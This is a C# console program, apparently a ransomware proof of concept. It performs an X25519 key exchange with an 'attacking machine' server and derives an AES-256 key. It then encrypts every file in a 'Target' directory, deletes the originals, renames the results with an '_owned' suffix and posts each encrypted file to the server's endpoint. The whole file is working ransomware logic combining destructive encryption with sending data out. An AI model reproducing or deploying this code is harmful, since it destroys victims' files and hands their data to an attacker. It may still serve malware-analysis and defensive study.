// See https://aka.ms/new-console-template for more information\
using CasDotnetSdk.KeyExchange.Types;
using CasDotnetSdk.KeyExchange;
using CasDotnetSdk.Symmetric;
using Shared;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using CasDotnetSdk.Symmetric.Types;

try
{
    string receiverHost = "https://localhost:7155/api/Encryption";
    using HttpClient hc = new HttpClient();
    X25519Wrapper x25519Wrapper = new X25519Wrapper();
    X25519SecretPublicKey x25519SecretPublicKey = x25519Wrapper.GenerateSecretAndPublicKey();
    DiffieHellmanInitialExchangeRequest request = new DiffieHellmanInitialExchangeRequest()
    {
        AttackingMachinesPublicKey = x25519SecretPublicKey.PublicKey
    };
    string requestSeralized = JsonSerializer.Serialize(request);
    var requestContent = new StringContent(requestSeralized, Encoding.UTF8, "application/json");
    HttpResponseMessage httpGetResult = await hc.PostAsync(receiverHost + "/DiffieHellmanPublicKey", requestContent);
    
    string content = await httpGetResult.Content.ReadAsStringAsync();
    JsonSerializerOptions options = new JsonSerializerOptions();
    options.PropertyNameCaseInsensitive = true;
    DiffieHellmanInitialExchangeResponse parsedContent = JsonSerializer.Deserialize<DiffieHellmanInitialExchangeResponse>(content, options);
    X25519SharedSecret sharedSecret = x25519Wrapper.GenerateSharedSecret(x25519SecretPublicKey.SecretKey, parsedContent.ServersPublicKey);
    AESWrapper aesWrapper = new AESWrapper();
    Aes256KeyAndNonceX25519DiffieHellman aesKeyAndNonce = aesWrapper.Aes256KeyNonceX25519DiffieHellman(sharedSecret.SharedSecret);

    string currentDir = Directory.GetCurrentDirectory();
    string targetDir = currentDir + "/" + "Target";
    string[] currentFiles = Directory.GetFiles(targetDir);
    for (int i = 0; i < currentFiles.Length; i++)
    {
        string currentFile = currentFiles[i];
        string[] fileName = Path.GetFileName(currentFile).Split(".");
        string newFileName = fileName[0] + "_owned." + fileName[1];
        byte[] fileBytes = File.ReadAllBytes(currentFile);
        byte[] encrypted = aesWrapper.Aes256EncryptBytes(aesKeyAndNonce.AesNonce, aesKeyAndNonce.AesKey, fileBytes);
        File.Delete(currentFile);
        File.WriteAllBytes(targetDir + "/" + newFileName, encrypted);
        AesEncryptedFile encryptedFileBody = new AesEncryptedFile()
        {
            EncryptedBytes = encrypted,
            Id = parsedContent.Id,
            FileName = newFileName,
        };
        string postBody = JsonSerializer.Serialize(encryptedFileBody, options);
        var stringContent = new StringContent(postBody, Encoding.UTF8, "application/json");
        HttpResponseMessage response = await hc.PostAsync(receiverHost + "/AesEncryptedFile", stringContent);
        if (response.IsSuccessStatusCode)
        {
            Console.Write("Success");
        }
    }

    while (Console.ReadLine() != "q")
    {
    };

} catch(Exception ex)
{
    throw ex;
}